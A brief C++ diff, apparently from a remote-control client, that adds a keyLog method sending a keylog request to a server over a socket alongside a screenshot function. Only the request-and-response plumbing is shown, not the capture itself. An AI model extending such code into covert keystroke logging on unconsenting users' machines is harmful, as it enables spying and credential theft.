@@ -301,11 +301,19 @@ int Client::screenShot(){
     return 0;
 }
 
-int Client::startKeylog(){
-    return 0;
-}
+int Client::keyLog(){
+    Request requestToServer(KEYLOG_REQUEST, 0, NULL);
+    int status = sendRequest(this->sockfd, requestToServer, 0);
+    if(status == SOCKET_ERROR)
+        return SOCKET_ERROR;
 
-int Client::stopKeylog(){
+    Response responseFromServer;
+    status = recvResponse(this->sockfd, responseFromServer, 0);
+    if(status == SOCKET_ERROR)
+        return SOCKET_ERROR;
+
+    if(responseFromServer.errCode() == FAIL_CODE)
+        return -1;
     return 0;
 }
 
